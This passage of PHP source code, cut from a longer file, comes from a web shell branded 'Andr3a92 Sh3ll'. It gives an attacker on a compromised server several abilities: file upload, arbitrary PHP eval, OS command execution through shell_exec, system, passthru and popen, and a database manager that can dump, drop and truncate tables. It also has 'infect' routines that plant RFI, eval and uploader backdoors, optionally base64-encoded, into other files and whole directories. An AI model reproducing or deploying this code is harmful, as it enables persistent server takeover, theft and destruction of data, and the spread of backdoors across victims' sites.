<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action4\"><input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action4.submit()\">Connect to database</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action5\"><input type=\"hidden\" name=\"action\" value=\"eval\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action5.submit()\">Eval PHP code</a></center></form></td></tr><tr>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action6\"><input type=\"hidden\" name=\"action\" value=\"infectfile\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action6.submit()\">Infect a file</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action7\"><input type=\"hidden\" name=\"action\" value=\"infectdir\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action7.submit()\">Infect directory</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action8\"><input type=\"hidden\" name=\"phpinfo\" value=\"view\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action8.submit()\">View PHP Info</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action9\"><input type=\"hidden\" name=\"action\" value=\"zip\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action9.submit()\">Zip this dir</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action10\"><input type=\"hidden\" name=\"action\" value=\"unistall\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action10.submit()\">Unistall</a></center></form></td>
<td bgcolor=\"#CCCCCC\"><center><form action=\"".$shell."\" method=\"POST\" name=\"action11\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.action11.submit()\">X</a></center></form></td>
</tr></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">";

//To upload a file
if($action == "upload"){
	echo "<tr><td bgcolor=\"#CCCCCC\"><center>
	<form enctype=\"multipart/form-data\" method=\"POST\" action=\"\">
	<br><b>File:</b> <input type=\"hidden\" name=\"action\" value=\"upload\">
	<input type=\"file\" name=\"file\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
	<input type=\"submit\" value=\"Upload\" name=\"upload\">
	</form>";
	if(!isset($_POST['upload'])) echo "</center></td></tr>";
	elseif(isset($_POST['upload'])){
		$temporaney = $_FILES['file']['tmp_name'];
		$upload = $_FILES['file']['name'];
		if(move_uploaded_file($temporaney,$upload))	echo "<font color=\"green\">File uploaded Succesfull</font>";
		else echo "<font color=\"red\">Error!<br>The file was not uploaded!</font>";  
		echo "<br>&nbsp;</center></td></tr>";
	}
}
elseif($action == "unistall"){
	if(!isset($_POST['confirm'])){
		echo "<form action=\"\" method=\"POST\" name=\"confirm\"><input type=\"hidden\" name=\"action\" value=\"unistall\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"confirm\" value=\"ok\"></form>
		<script language=\"javascript\">
		var answer = confirm (\"Are you sure to delete this shell?\")
		if(answer) document.confirm.submit()
		</script>";
	}
	else{
		$s = basename($shell);
//		if(unlink($s)) echo "<tr><td bgcolor=\"#CCCCCC\"><center><br>Good bye! Thank's for use this shell!<br>&nbsp;</center></tr>";
//		else echo "<tr><td bgcolor=\"#CCCCCC\"><center><br>Cannot delete this shell!<br>&nbsp;</center></tr>";
	}
}

// To infect a file
elseif($action == "infectfile"){
	if(!isset($_POST['infect'])){
		echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"black\"><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Infect File</font></center></td></tr></table>
		<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"infectfile\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">File name:<br><input type=\"text\" name=\"filename\"><br><br>
		Infection type:<br> <select name=\"mode\" "?>onChange='if(this.options[1].selected) document.getElementById("div").innerHTML="Eval: execution of php code.<br>Usage: infectedpage.php<font color=\"red\">?eval=[EVIL CODE]</font><br>Important: the code cannot have the php open and close tag!";
		else if(this.options[2].selected) document.getElementById("div").innerHTML="Remote eval: execution of php code located on a external page.<br>Usage: infectedpage.php<font color=\"red\">?remoteeval=[LINK CODE]</font><br>Important: the code in the external page cannot have the php open and close tag!";
		else if(this.options[3].selected) document.getElementById("div").innerHTML="Uploader: upload a file.<br>Usage: infectedpage.php<font color=\"red\">?upload=ok</font>";
		else document.getElementById("div").innerHTML="RFI: remote file inclusion.<br>Usage: infectedpage.php<font color=\"red\">?rfi=[LINK SHELL]</font>"; ';
		<?php echo "><option value=\"rfi\">RFI</option><option value=\"eval\">Eval</option><option value=\"eval_remote_file\">Remote eval</option>
		<option value=\"uploader\">Uploader</option></select><br><br>Base64 crypt: <input type=\"checkbox\" name=\"base64\"><br><br><div id=\"div\">RFI: remote file inclusion.<br>Usage: infectedpage.php<font color=\"red\">?rfi=[LINK SHELL]</font></div>
		<br><br><input type=\"submit\" value=\"Infect\" name=\"infect\"></form></center></td></tr></table>";
	}
	else{
		echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"black\"><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Infect File</font></center></td></tr></table>
		<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"#CCCCCC\"><br><center>";
		if($_POST['base64'] != ""){
			$safe = 1;
			$buse = "yes";
		}
		else{
			$safe = 0;
			$buse = "no";
		}
		if(infect_file($_POST['filename'],$_POST['mode'],$safe)) echo '<font color="green">File '.htmlspecialchars($_POST['filename']).' infected with '.htmlspecialchars($_POST['mode']).', using base64: '.$buse.'!</font>';
		else '<font color="red">Error! This file cannot be infected!</font>';
		echo "<br>&nbsp;</center></td></tr></table>";
	}
	echo '<br>';
}

//to infect a dir
if($action == "infectdir"){
	if(!isset($_POST['infect'])){
		echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"black\"><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Infect Files</font></center></td></tr></table>
		<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"infectdir\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">Dir name (Leave blank if you want to infect current dir):<br><input type=\"text\" name=\"dirname\"><br><br>
		Infection type:<br> <select name=\"mode\" "?>onChange='if(this.options[1].selected) document.getElementById("div").innerHTML="Eval: execution of php code.<br>Usage: infectedpage.php<font color=\"red\">?eval=[EVIL CODE]</font><br>Important: the code cannot have the php open and close tag!";
		else if(this.options[2].selected) document.getElementById("div").innerHTML="Remote eval: execution of php code located on a external page.<br>Usage: infectedpage.php<font color=\"red\">?remoteeval=[LINK CODE]</font><br>Important: the code in the external page cannot have the php open and close tag!";
		else if(this.options[3].selected) document.getElementById("div").innerHTML="Uploader: upload a file.<br>Usage: infectedpage.php<font color=\"red\">?upload=ok</font>";
		else document.getElementById("div").innerHTML="RFI: remote file inclusion.<br>Usage: infectedpage.php<font color=\"red\">?rfi=[LINK SHELL]</font>"; ';
		<?php echo "><option value=\"rfi\">RFI</option><option value=\"eval\">Eval</option><option value=\"eval_remote_file\">Remote eval</option>
		<option value=\"uploader\">Uploader</option></select><br><br>Base64 crypt: <input type=\"checkbox\" name=\"base64\"><br><br><div id=\"div\">RFI: remote file inclusion.<br>Usage: infectedpage.php<font color=\"red\">?rfi=[LINK SHELL]</font></div>
		<br><br><input type=\"submit\" value=\"Infect\" name=\"infect\"></form></center></td></tr></table>";
	}
	else{
		echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"black\"><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Infect Files</font></center></td></tr></table>
		<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"#CCCCCC\"><br><center>";
		if($_POST['dirname'] != "" && is_dir($_POST['dirname'])) $dirname = $_POST['dirname'];
		else $dirname = "";
		if($_POST['base64'] != "") $safe = 1;
		else $safe = 0;
		infect_files($_POST['mode'],$dirname,$safe);
		for($a = 0; $a < count($infected_files); $a++) echo '<font color="green">File '.htmlspecialchars($infected_files[$a]).' infected with '.htmlspecialchars($_POST['mode']).'!</font><br>';
		echo "</center></td></tr></table>";
	}
	echo '<br>';
}

// To eval a code
elseif($action == "eval"){
	if(!isset($_POST['feval']))	echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"action\" value=\"eval\">PHP code:<br><br><textarea rows=\"30\" cols=\"77\" name=\"eval\"></textarea><br><br><input type=\"submit\" value=\"Eval\" name=\"feval\"></form></center><br>&nbsp;</td></tr>";
	else{
		echo "<tr><td bgcolor=\"#CCCCCC\"><br><center>";
		if($strip_all) eval(stripslashes($_POST['eval']));
		else eval($_POST['eval']);
		echo "<br>&nbsp;</td></tr>";
	}
}

//To make a directory
elseif($action == "md"){
	echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
	<b>Directory's name:</b> <input type=\"text\" name=\"dirname\"><input type=\"hidden\" name=\"action\" value=\"md\">
	<input type=\"submit\" value=\"Create directory\" name=\"makedir\"></form>";
	if(isset($_POST['makedir'])){
		if(!is_dir($_POST['dirname'])){
			$dir_name = htmlspecialchars($_POST['dirname']);
			if(mkdir($dir_name)) echo "<font color=\"green\">Directory ".htmlspecialchars($_POST['dirname'])." created succesfull!</font>";
			else echo "<font color=\"red\">Error!<br>Directory ".htmlspecialchars($_POST['dirname'])." cannot be created!</font>";
		}
		else echo "<font color=\"red\">Error!<br>Directory ".htmlspecialchars($_POST['dirname'])." already exists!</font>";
		echo "<br>&nbsp;";
	}
	echo "</center></tr></tr>";
}

//Execute a command
elseif($action == "exe"){
	echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><b>Command: </b><input type=\"text\" name=\"command\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"action\" value=\"exe\">
	<select name=\"method\" ";?>onChange='if(this.options[4].selected) document.getElementById("div").innerHTML="<b>Mode:</b> <input type=\"text\" name=\"mode\"> "; else document.getElementById("div").innerHTML="";' <?php echo "><option value=\"shell_exec\">Shell_exec</option><option value=\"exec\">Exec</option><option value=\"system\">System</option>
	<option value=\"passthru\">Passthru</option><option value=\"popen\">Popen</option></select> <input type=\"submit\" value=\"Execute\" name=\"execute\"><div id=\"div\"></div></form>";
	if(!isset($_POST['execute'])) echo "<br>&nbsp;</td></tr>";
	elseif(isset($_POST['execute'])){
		Switch($_POST['method']){
			Case 'shell_exec':
				if($strip_all) echo "Response: ".shell_exec(stripslashes($_POST['command']));
				else echo "Response: ".shell_exec($_POST['command']);
				break;
			Case 'exec':
				if($strip_all) echo "Response: ".exec(stripslashes($_POST['command']));
				else echo "Response: ".exec($_POST['command']);
				break;
			Case 'system':
				if($strip_all) echo "Response: ".system(stripslashes($_POST['command']),$return)."<br>Return value: ".$return;
				else echo "Response: ".system($_POST['command'],$return)."<br>Return value: ".$return;
				break;
			Case 'passthru':
				if($strip_all) echo "Response: ".passthru(stripslashes($_POST['command']));
				else echo "Response: ".passthru($_POST['command']);
				break;
			Case 'popen':
				if($strip_all) echo "Response: ".popen(stripslashes($_POST['command']),stripslashes($_POST['mode']));
				else echo "Response: ".popen($_POST['command'],$_POST['mode']);
				break;
		}
		echo "<br>&nbsp;</td></tr>";
	}
}

//To create a file
elseif($action == "mf"){
	if(!isset($_POST['fcreate'])) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"action\" value=\"mf\"><b>Name file:</b><br><input type=\"text\" name=\"fname\"><br><br><b>Contents:</b><br><textarea rows=\"30\" cols=\"77\" name=\"contentsfp\"></textarea><br><br><input type=\"submit\" value=\"Create\" name=\"fcreate\"></form></center></td></tr></table>";
	elseif(isset($_POST['fcreate'])){
		if(!is_file($_POST['fname'])){
			$fp_to = htmlspecialchars($_POST['fname']);
			$fp = fopen($fp_to , "x+");
			if($strip_all) $fp_contents = stripslashes($_POST['contentsfp']);
			else $fp_contents = $_POST['contentsfp'];
			fwrite($fp , $fp_contents);
			fclose($fp);
			if(file_exists($fp_to)) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"green\">File ".$fp_to." created succesfull!<br>&nbsp</font></center></td></tr>";
			else echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"red\">Error!<br>This file cannot be created!</font><br>&nbsp;</center></td></tr>";
		}
		else echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"red\">Error!<br>This file already exists!</font><br>&nbsp;</center></td></tr>";
	}
}

elseif($action == "connect"){
	if(!isset($_COOKIE['username']) || !isset($_COOKIE['password']) || !isset($_COOKIE['host']) || !isset($_COOKIE['db'])){
		if(!isset($_POST['form'])){	
			echo "</table><br><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
			<tr><td bgcolor=\"black\"><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Connect </font></center></td></tr>
			</table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"action\" value=\"connect\">";
			echo "Host:<br><input type=\"text\" name=\"host\"><br><br>";
			echo "Username:<br><input type=\"text\" name=\"username\"><br><br>";
			echo "Password:<br><input type=\"password\" name=\"password\"><br><br>";
			echo "Database:<br><input type=\"text\" name=\"db\"><br><br>";
			echo "<input type=\"submit\" value=\"Login\" name=\"form\"><br>&nbsp;</form></td></tr></table>";
		}
		else{
			foreach($_POST as $k => $v){
				setcookie($k,$v);
			}
			echo '<form action="'.$shell.'" method="POST" name="refresh"><input type="hidden" name="dir" value="'.$dir.'"><input type="hidden" name="action" value="connect"><script>document.refresh.submit()</script></form>';
		}
	}
	else{
		$act = htmlspecialchars($_POST['act_mysql']);
		echo "</table><br><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
		<tr><td bgcolor=\"black\"><center><table id=\"querymenu\"><tr><td><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Database '".htmlspecialchars($_COOKIE['db'])."' </center></font></td>
		<td width=\"16\"><form action=\"".$shell."\" method=\"POST\" name=\"makethisquery\"><input type=\"hidden\" name=\"action\" value=\"connect\">
		<input type=\"hidden\" name=\"act_mysql\" value=\"makequery\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
		<a href=\"#\" onclick=\"document.makethisquery.submit()\"><img src=\"".$shell."?img=query\" border=\"0\" title=\"execute query\"></a></form></td><td width=\"16\">
		<form action=\"".$shell."\" method=\"POST\" name=\"makethisdump\"><input type=\"hidden\" name=\"action\" value=\"connect\">
		<input type=\"hidden\" name=\"act_mysql\" value=\"dump\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
		<a href=\"#\" onclick=\"document.makethisdump.submit()\"><img src=\"".$shell."?img=download\" border=\"0\" title=\"dump\"></a></form></td><td width=\"16\">
		<form action=\"".$shell."\" method=\"POST\" name=\"refresh\"><input type=\"hidden\" name=\"action\" value=\"connect\">
		<input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><a href=\"#\" onclick=\"document.refresh.submit()\"><img src=\"".$shell."?img=refresh\" border=\"0\" title=\"refresh\"></a></form>
		</td></tr></table></td></tr>
		<tr><td><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td bgcolor=\"#CCCCCC\">";
		if($act != "dump" && $act != "makequery"){
			if(mysql_connect($_COOKIE['host'],$_COOKIE['username'],$_COOKIE['password'])){
				if(mysql_select_db($_COOKIE['db'])){
					$show = mysql_query("SHOW TABLES");
					echo "<table id=\"queryshow\">";
					$a = 0;
					while($row = mysql_fetch_array($show)){
						echo "<tr><td width=\"16\"><form action=\"".$shell."\" method=\"POST\" name=\"dump".$a."\"><input type=\"hidden\" name=\"action\" value=\"connect\">
						<input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"act_mysql\" value=\"dump\"><input type=\"hidden\" name=\"dump_table\" value=\"".$row[0]."\">
						<a href=\"#\" onclick=\"document.dump".$a.".submit()\"><img src=\"".$shell."?img=download\" border=\"0\" title=\"dump\"></a></form></td><td width=\"16\">
						<form action=\"".$shell."\" method=\"POST\" name=\"drop".$a."\"><input type=\"hidden\" name=\"action\" value=\"connect\">
						<input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"table\" value=\"".$row[0]."\">
						<input type=\"hidden\" name=\"act_mysql\" value=\"deletetable\"><a href=\"#\" onclick=\"document.drop".$a.".submit()\"><img src=\"".$shell."?img=delete\" border=\"0\" title=\"delete\"></a></form></td><td>
						<form action=\"".$shell."\" method=\"POST\" name=\"truncate".$a."\"><input type=\"hidden\" name=\"action\" value=\"connect\">
						<input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"act_mysql\" value=\"truncate\"><input type=\"hidden\" name=\"table\" value=\"".$row[0]."\">
						<a href=\"#\" onclick=\"document.truncate".$a.".submit()\"><img src=\"".$shell."?img=truncate\" border=\"0\" title=\"truncate\"></a></form></td><td>
						<form action=\"".$shell."\" method=\"POST\" name=\"view".$a."\"><input type=\"hidden\" name=\"action\" value=\"connect\">
						<input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"act_mysql\" value=\"view\"><input type=\"hidden\" name=\"query\" value=\"".$row[0]."\">
						<a href=\"#\" onclick=\"document.view".$a.".submit()\">".$row[0]."</a></form></td></tr>";
						$a++;
					}
					echo "</table></td><td bgcolor=\"#CCCCCC\">";
					if($act == "view"){
						echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>";
						if($strip_all) $table = stripslashes($_POST['query']);
						else $table = $_POST['query'];
						$select = mysql_query("SELECT * FROM `".$table."`");
						for($cr = 0; $cr <  mysql_num_fields($select); $cr++){
							$name = mysql_field_name($select,$cr);
							echo "<td bgcolor=\"#CCCCCC\">".$name."</td>";
						}
						echo "<td bgcolor=\"#CCCCCC\">Action</td></tr>";
						$n = array();
						$a = 0;
						while ($row = mysql_fetch_array($select, MYSQL_ASSOC)) {
							echo "<tr>";
							$rl = 0;
							foreach ($row as $k=>$v) {
								$n[$rl] = $v;
								if($v == "") $v = "&nbsp;";
								echo "<td bgcolor=\"#CCCCCC\">".$v."</td>";
								$rl++;
							}
							$del = "";
							for($cr = 0; $cr <  mysql_num_fields($select); $cr++){
								$name = mysql_field_name($select,$cr);
								$del .= "`".mysql_real_escape_string($name)."` = '".mysql_real_escape_string($n[$cr])."'";
								if($cr+1 < mysql_num_fields($select)) $del .= " AND ";
							}
							echo "<td bgcolor=\"#CCCCCC\"><table id=\"query_act\"><tr><td><form action=\"".$shell."\" method=\"POST\" name=\"q_edit".$a."\">
							<input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
							<input type=\"hidden\" name=\"query\" value=\"SELECT * FROM `".$table."` WHERE ".$del."\"><input type=\"hidden\" name=\"table\" value=\"".$table."\">
							<input type=\"hidden\" name=\"act_mysql\" value=\"edit\"><a href=\"#\" onclick=\"document.q_edit".$a.".submit()\"><img src=\"".$shell."?img=edit\" border=\"0\" title=\"delete\"></a></form></td><td>
							<form action=\"".$shell."\" method=\"POST\" name=\"q_delete".$a."\">
							<input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
							<input type=\"hidden\" name=\"query\" value=\"DELETE FROM `".$table."` WHERE ".$del."\">
							<input type=\"hidden\" name=\"act_mysql\" value=\"delete\"><a href=\"#\" onclick=\"document.q_delete".$a.".submit()\"><img src=\"".$shell."?img=delete\" border=\"0\" title=\"delete\"></a></form>
							</td></tr></table></td></tr>";
							$a++;
						}
						echo "</table><br><br><form action=\"".$shell."\" method=\"POST\" name=\"insert_\"><input type=\"hidden\" value=\"connect\" name=\"action\">";
						if($dir != "") echo "<input type=\"hidden\" value=\"".$dir."\" name=\"dir\">";
						echo "<input type=\"hidden\" value=\"insert\" name=\"act_mysql\"><input type=\"hidden\" name=\"table\" value=\"".$table."\"><input type=\"submit\" value=\"Insert\"></form></td></tr></table>";
					}
					elseif($act == "delete"){
						if(!isset($_POST['confirm'])){
							echo "<form action=\"".$shell."\" method=\"POST\" name=\"confirm\">
							<input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
							<input type=\"hidden\" name=\"query\" value=\"";
							if($strip_all) echo stripslashes($_POST['query']);
							else echo $_POST['query'];
							echo "\">
							<input type=\"hidden\" name=\"act_mysql\" value=\"delete\"><input type=\"hidden\" value=\"1\" name=\"confirm\"></form>
							<script language=\"javascript\">
							var answer = confirm (\"Are you sure to delete this value?\")
							if(answer) document.confirm.submit()</script>";
						}
						else{
							echo "<center>";
							if($strip_all) $query = stripslashes($_POST['query']);
							else $query = $_POST['query'];
							if(mysql_query($query)) echo "<font color=\"green\">Deleted successfull!</font>";
							else echo "<font color=\"red\">Error!Cannot delete this value!</font>";
							echo "</center>";
						}
					}
					elseif($act == "deletetable"){
						if(!isset($_POST['confirm'])){
							echo "<form action=\"".$shell."\" method=\"POST\" name=\"confirm\">
							<input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
							<input type=\"hidden\" name=\"act_mysql\" value=\"deletetable\"><input type=\"hidden\" name=\"table\" value=\"";
							if($strip_all) echo stripslashes($_POST['table']);
							else echo $_POST['table'];
							echo "\"><input type=\"hidden\" value=\"1\" name=\"confirm\"></form>
							<script language=\"javascript\">
							var answer = confirm (\"Are you sure to delete table ".htmlspecialchars($_POST['table'])."?\")
							if(answer) document.confirm.submit()</script>";
						}
						else{
							echo "<center>";
							if($strip_all) $query = stripslashes($_POST['table']);
							else $query = $_POST['table'];
							if(mysql_query("DROP TABLE `".$query."`")) echo "<font color=\"green\">Table ".$query." deleted successfull!</font>";
							else echo "<font color=\"red\">Error!Cannot delete table ".$query."!</font>";
							echo "</center>";
						}
					}
					elseif($act == "truncate"){
						if(!isset($_POST['confirm'])){
							echo "<form action=\"".$shell."\" method=\"POST\" name=\"confirm\">
							<input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
							<input type=\"hidden\" name=\"act_mysql\" value=\"truncate\"><input type=\"hidden\" name=\"table\" value=\"";
							if($strip_all) echo stripslashes($_POST['table']);
							else echo $_POST['table'];
							echo "\"><input type=\"hidden\" value=\"1\" name=\"confirm\"></form>
							<script language=\"javascript\">
							var answer = confirm (\"Are you sure to truncate table ".htmlspecialchars($_POST['table'])."?\")
							if(answer) document.confirm.submit()</script>";
						}
						else{
							echo "<center>";
							if($strip_all) $query = stripslashes($_POST['table']);
							else $query = $_POST['table'];
							if(mysql_query("TRUNCATE TABLE `".$query."`")) echo "<font color=\"green\">Table ".$query." truncated successfull!</font>";
							else echo "<font color=\"red\">Error!Cannot truncate table ".$query."!</font>";
							echo "</center>";
						}
					}
					elseif($act == "edit"){
						if(!isset($_POST['edit_camp'])){
							if($strip_all) $space = mysql_query(stripslashes($_POST['query']));
							else $space = mysql_query($_POST['query']);
							$row = mysql_fetch_array($space, MYSQL_ASSOC);
							echo "<form action=\"".$shell."\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
							<input type=\"hidden\" name=\"act_mysql\" value=\"edit\">
							<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>";
							for($cr = 0; $cr <  mysql_num_fields($space); $cr++){
								$name = mysql_field_name($space,$cr);
								echo "<td bgcolor=\"#CCCCCC\">".$name."</td>";
							}
							echo "</td></tr><tr>";
							$rl = 0;
							$n = array();
							$r = array();
							foreach ($row as $k=>$v) {
								$n[$rl] = $k;
								$r[$rl] = $v;
								$rl++;
							}
							for($a = 0; $a < count($n); $a++) echo "<td bgcolor=\"#CCCCCC\"><input type=\"text\" name=\"".$n[$a]."\" value=\"".$r[$a]."\"></td>";
							echo "</tr></table><br><input type=\"hidden\" name=\"query\" value=\"";
							if($strip_all) echo stripslashes($_POST['query']);
							else echo $_POST['query'];
							echo "\"><input type=\"hidden\" name=\"table\" value=\"";
							if($strip_all) echo stripslashes($_POST['table']);
							else echo $_POST['table'];
							echo "\"><input type=\"submit\" value=\"Edit\" name=\"edit_camp\"></form>";
						}
						else{
							$table = $_POST['table'];
							if($strip_all) $query = mysql_query(stripslashes($_POST['query']));
							else $query = mysql_query($_POST['query']);
							if($strip_all) $exp = explode("WHERE ",stripslashes($_POST['query']));
							else $exp = explode("WHERE ",$_POST['query']);
							$row = mysql_fetch_array($query, MYSQL_ASSOC);
							if($strip_all) $update .= "UPDATE ".stripslashes($table)." SET ";
							else $update .= "UPDATE ".$table." SET ";
							$cr = 0;
							foreach ($row as $k=>$v) {
								if($strip_all) $update .= "`".stripslashes($k)."` = '".stripslashes($_POST[$k])."'";
								else $update .= "`".$k."` = '".$_POST[$k]."'";
								if($cr+1 < mysql_num_fields($query)) $update .= " , ";
								$cr++;
							}
							if($strip_all) $update .= " WHERE ".stripslashes($exp[1]);
							else $update .= " WHERE ".$exp[1];
							if(mysql_query($update)) echo "<font color=\"green\">Edited succesfull!</font>";
							else echo "<font color=\"red\">Error!Cannot edit this value!</font>";
							echo "</center>";
						}
						echo "</td></tr></table>";
					}
					elseif($act == "insert"){
						if(!isset($_POST['my_insr'])){
							if($strip_all) $select = mysql_query("SELECT * FROM `".stripslashes($_POST['table'])."`");
							else $select = mysql_query("SELECT * FROM `".$_POST['table']."`");
							$n = array();
							for($a = 0; $a < mysql_num_fields($select); $a++) $n[$a] = mysql_field_name($select,$a);
							echo "<form action=\"".$shell."\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"connect\">
							<input type=\"hidden\" name=\"act_mysql\" value=\"insert\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"table\" value=\"".htmlspecialchars($_POST['table'])."\">
							<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>";
							for($a = 0; $a < count($n); $a++) echo "<td bgcolor=\"#CCCCCC\">".$n[$a]."</td>";
							echo "</tr><tr>";
							for($a = 0; $a < count($n); $a++) echo "<td bgcolor=\"#CCCCCC\"><input type=\"text\" name=\"".$n[$a]."\"></td>";
							echo "</tr></table><br>";
							echo "<input type=\"submit\" value=\"Insert\" name=\"my_insr\"></form>";
						}
						else{
							if($strip_all) $select = mysql_query("SELECT * FROM `".stripslashes($_POST['table'])."`");
							else $select = mysql_query("SELECT * FROM `".$_POST['table']."`");
							$n = array();
							for($a = 0; $a < mysql_num_fields($select); $a++) $n[$a] = mysql_field_name($select,$a);
							$query = "INSERT INTO `".$_POST['table']."`(`";
							for($a = 0; $a < count($n); $a++){
								$query .= $n[$a]."`";
								if($a < count($n) -1) $query .= ",`";
							}
							$query .= ") VALUES('";
							for($a = 0; $a < count($n); $a++){
								$query .= addslashes($_POST[$n[$a]])."'";
								if($a < count($n) -1) $query .= ",'";
							}
							$query .= ")";
							if(mysql_query($query)) echo "<font color=\"green\">Inserted succesfull!</font>";
							else echo "<font color=\"red\">Error!</font>";
						}
						echo "</td></tr></table>";
					}
					else echo "</td></tr></table>";
					mysql_close();
				}
				else{
					mysql_close();
					echo "<font color=\"red\">An error occurted! Could not select the database called ".htmlspecialchars($_COOKIE['db'])."!</font>";
					setcookie("username","",time() - 3600);
					setcookie("password","",time() - 3600);
					setcookie("host","",time() - 3600);
					setcookie("db","",time() - 3600);
					echo '</tr></td></table>';
				}
			}	
			else{
				mysql_close();
				echo "<font color=\"red\">An error occurted! Could not login ".htmlspecialchars($_COOKIE['username'])." @ ".htmlspecialchars($_COOKIE['host'])."!</font>";
				setcookie("username","",time() - 3600);
				setcookie("password","",time() - 3600);
				setcookie("host","",time() - 3600);
				setcookie("db","",time() - 3600);
				echo '</tr></td></table>';
			}
		}
		else{
			echo "<center><br>";
			if($act == "dump"){
				if($_POST['dump_table'] != ""){ 
					if(!isset($_POST['dump'])){
						echo "<form action=\"\" method=\"post\"><input type=\"hidden\" name=\"act_mysql\" value=\"dump\">Dump file name(leave blank for default!):<br><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"dump_table\" value=\"";
						if($strip_all) echo htmlspecialchars(stripslashes($_POST['dump_table']));
